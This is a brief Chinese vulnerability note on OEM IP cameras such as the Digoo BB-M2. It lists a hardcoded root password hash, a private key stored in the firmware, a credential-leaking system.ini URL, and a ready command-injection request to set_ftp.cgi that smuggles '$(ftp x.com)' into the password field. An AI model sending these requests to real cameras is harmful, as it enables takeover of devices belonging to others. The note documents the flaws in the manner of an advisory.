##cve编号：无
##漏洞名称：OEM摄像头漏洞
##漏洞类型：摄像头命令执行，敏感信息泄漏
##影响版本：
- Digoo BB-M2
- 影响很多，超过1250款OEM型号和20多万台摄像头
##利用脚本：
- 无
##漏洞细节：
- 固件中存在一组账户： `root:$1$ybdHbPDn$ii9aEIFNiolBbM9QxW9mr0:0:0::/root:/bin/sh`
- 固件的` /system/www/pem/ck.pem` 文件包含了Apple证书和私钥
- `http://url/system.ini?loginuse&loginpas`
- 需要登录的命令执行 
- `http://192.168.1.100/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas=password&svr=192.168.1.1&port=21&user=ftp&pwd=$(ftp x.com)ftp&dir=/&mode=PORT&upload_interval=0`
##reference：
[link](https://ht-sec.org/wireless-ip-camera-multiple-vulnerabilities/)
